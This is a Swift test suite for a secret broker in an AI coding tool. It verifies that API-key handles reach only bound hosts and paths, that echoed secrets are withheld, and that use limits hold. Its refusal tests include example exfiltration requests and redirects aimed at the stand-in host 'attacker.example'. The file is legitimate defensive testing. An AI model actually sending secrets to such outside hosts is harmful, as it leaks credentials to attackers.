import BelloCore
import Foundation
import Testing

@testable import SecretKit

/// The brokered HTTP tool against loopback TLS servers (`localhost`): handles only to bound destinations, redirects
/// only within the binding, responses withheld when they contain the value in any form.
@Suite("Secret broker", .serialized, .timeLimit(.minutes(2)))
struct BrokerTests {
    static let canary = "sk_live_CANARY_\(UUID().uuidString.replacingOccurrences(of: "-", with: ""))"

    struct Fixture {
        let ca: CertificateAuthority
        let server: EchoServer
        let broker: SecretBroker
        let secret: ManagedSecret
        var origin: String { "https://localhost:\(server.port)" }
        var secrets: [String: (ManagedSecret, SecretValue)] { ["API_KEY": (secret, SecretValue(BrokerTests.canary))] }
        func stop() { server.stop() }
    }

    static func fixture(pathPrefixes: [String] = ["/v1"], maxUses: Int? = nil) async throws -> Fixture {
        let ca = try CertificateAuthority(commonName: "Broker test CA")
        let server = try await EchoServer(name: "localhost", authority: ca)
        let binding = SecretBinding(host: "localhost", port: Int(server.port), pathPrefixes: pathPrefixes,
                                    locations: [.header("Authorization", prefix: "Bearer ")], maxUses: maxUses)
        let secret = ManagedSecret(account: "bcs_broker", name: "API_KEY", label: "Broker key", mode: .brokered, bindings: [binding])
        return Fixture(ca: ca, server: server, broker: SecretBroker(extraAnchors: [ca.certificateDER]), secret: secret)
    }

    func leaked(_ text: String) -> Bool { !SecretPatterns(value: Data(Self.canary.utf8)).forms(in: Data(text.utf8)).isEmpty }

    @Test func handleIsSentOnlyToTheBindingAndEchoesAreWithheld() async throws {
        let f = try await Self.fixture()
        defer { f.stop() }
        // A normal call: the server receives the value; the agent sees status and body, never the value.
        let ok = await f.broker.perform(.init(method: "GET", url: f.origin + "/v1/ok", headers: ["Authorization": "Bearer {{secret:API_KEY}}"]),
                                        secrets: f.secrets, sessionID: "ses", projectDirectory: "/p")
        #expect(ok.text.hasPrefix("Status: 200"))
        #expect(ByteSearch.contains(f.server.receivedBytes, Data(Self.canary.utf8)))
        #expect(ok.audit.contains { $0.outcome == .brokered })
        // Every reflection is withheld.
        for encoding in ["raw", "gzip", "base64", "hex", "url", "json", "header", "split", "location"] {
            let echo = await f.broker.perform(.init(url: f.origin + "/v1/echo?enc=\(encoding)", headers: ["Authorization": "Bearer {{secret:API_KEY}}"]),
                                              secrets: f.secrets, sessionID: "ses", projectDirectory: "/p")
            #expect(!leaked(echo.text), "\(encoding)")
            #expect(echo.text.contains("withheld") || echo.text.contains("refused"), "\(encoding): \(echo.text.prefix(80))")
        }
    }

    @Test func refusals() async throws {
        let f = try await Self.fixture()
        defer { f.stop() }
        let attempts: [SecretBroker.Request] = [
            .init(url: "https://attacker.example/x", headers: ["Authorization": "Bearer {{secret:API_KEY}}"]),
            .init(url: f.origin + "/v2/x", headers: ["Authorization": "Bearer {{secret:API_KEY}}"]),
            .init(url: f.origin + "/v1/x?k={{secret:API_KEY}}"),
            .init(url: f.origin + "/v1/x", headers: ["X-Echo": "{{secret:API_KEY}}"]),
            .init(url: "http://localhost:\(f.server.port)/v1/x", headers: ["Authorization": "Bearer {{secret:API_KEY}}"]),
            .init(method: "POST", url: f.origin + "/v1/x", headers: ["Content-Type": "text/plain"], body: "{{secret:API_KEY}}"),
            .init(url: f.origin + "/v1/x"),
        ]
        for request in attempts {
            let outcome = await f.broker.perform(request, secrets: f.secrets, sessionID: "ses", projectDirectory: "/p")
            #expect(outcome.text.hasPrefix("BelloCode refused"), "\(request.url): \(outcome.text.prefix(100))")
        }
        #expect(!ByteSearch.contains(f.server.receivedBytes, Data(Self.canary.utf8)))
    }

    @Test func redirectsOutsideTheBindingAreRefused() async throws {
        let f = try await Self.fixture()
        defer { f.stop() }
        let away = await f.broker.perform(.init(url: f.origin + "/v1/redirect?to=https://attacker.example/steal", headers: ["Authorization": "Bearer {{secret:API_KEY}}"]),
                                          secrets: f.secrets, sessionID: "ses", projectDirectory: "/p")
        #expect(away.text.contains("redirect to https://attacker.example refused"))
        let outside = await f.broker.perform(.init(url: f.origin + "/v1/redirect?to=\(f.origin)/admin", headers: ["Authorization": "Bearer {{secret:API_KEY}}"]),
                                             secrets: f.secrets, sessionID: "ses", projectDirectory: "/p")
        #expect(outside.text.contains("refused"))
        let inside = await f.broker.perform(.init(url: f.origin + "/v1/redirect?to=\(f.origin)/v1/ok", headers: ["Authorization": "Bearer {{secret:API_KEY}}"]),
                                            secrets: f.secrets, sessionID: "ses", projectDirectory: "/p")
        #expect(inside.text.hasPrefix("Status: 200"))
    }

    @Test func handles() {
        let request = SecretBroker.Request(url: "https://x/{{secret:A}}", headers: ["H": "{{secret:B_2}} {{secret:A}}"], body: "{{secret:bad name}}")
        #expect(SecretBroker.handles(in: request) == ["A", "B_2"])
    }

    /// R12: a binding's use limit counts brokered calls against that binding: sequential calls, redirect hops and
    /// concurrent calls alike, in the ledger the proxy shares.
    @Test func useLimitsCountAgainstTheBinding() async throws {
        let f = try await Self.fixture(maxUses: 1)
        defer { f.stop() }
        let request = SecretBroker.Request(url: f.origin + "/v1/ok", headers: ["Authorization": "Bearer {{secret:API_KEY}}"])
        let first = await f.broker.perform(request, secrets: f.secrets, sessionID: "ses", projectDirectory: "/p")
        #expect(first.text.hasPrefix("Status: 200"), "\(first.text.prefix(80))")
        #expect(first.reserved.map(\.bindingID) == [f.secret.bindings[0].id], "counted against the binding, not a generic counter")
        let second = await f.broker.perform(request, secrets: f.secrets, sessionID: "ses", projectDirectory: "/p")
        #expect(second.text.contains("use limit"), "\(second.text.prefix(120))")
        #expect(ByteSearch.count(f.server.receivedBytes, Data(Self.canary.utf8)) == 1, "the value left the Mac once")
    }

    @Test func redirectHopsAndConcurrentCallsShareTheLimit() async throws {
        // A redirect within the binding is a second use.
        let f = try await Self.fixture(maxUses: 1)
        defer { f.stop() }
        let hop = await f.broker.perform(.init(url: f.origin + "/v1/redirect?to=\(f.origin)/v1/ok", headers: ["Authorization": "Bearer {{secret:API_KEY}}"]),
                                         secrets: f.secrets, sessionID: "ses", projectDirectory: "/p")
        #expect(hop.text.contains("use limit"), "\(hop.text.prefix(120))")
        // Eight simultaneous calls on a fresh one-use binding (one ledger, as in the app): exactly one is sent.
        let g = try await Self.fixture(maxUses: 1)
        defer { g.stop() }
        let broker = g.broker
        let secrets = g.secrets
        let request = SecretBroker.Request(url: g.origin + "/v1/ok", headers: ["Authorization": "Bearer {{secret:API_KEY}}"])
        let results = await withTaskGroup(of: String.self) { group in
            for _ in 0..<8 { group.addTask { await broker.perform(request, secrets: secrets, sessionID: "ses", projectDirectory: "/p").text } }
            var out: [String] = []
            for await text in group { out.append(text) }
            return out
        }
        #expect(results.filter { $0.hasPrefix("Status: 200") }.count == 1, "\(results.map { $0.prefix(40) })")
        #expect(ByteSearch.count(g.server.receivedBytes, Data(Self.canary.utf8)) == 1)
        // A use the proxy reserved in the shared ledger counts for the broker too.
        let h = try await Self.fixture(maxUses: 1)
        defer { h.stop() }
        let ledger = SecretUseLedger()
        #expect(ledger.reserve([SubstitutionUse(account: h.secret.account, bindingID: h.secret.bindings[0].id, sessionID: "s", placeholder: "p")], limit: { _ in 1 }))
        let shared = SecretBroker(extraAnchors: [h.ca.certificateDER], ledger: ledger)
        let refused = await shared.perform(.init(url: h.origin + "/v1/ok", headers: ["Authorization": "Bearer {{secret:API_KEY}}"]),
                                           secrets: h.secrets, sessionID: "ses", projectDirectory: "/p")
        #expect(refused.text.contains("use limit"))
        #expect(h.server.requestCount == 0)
    }
}
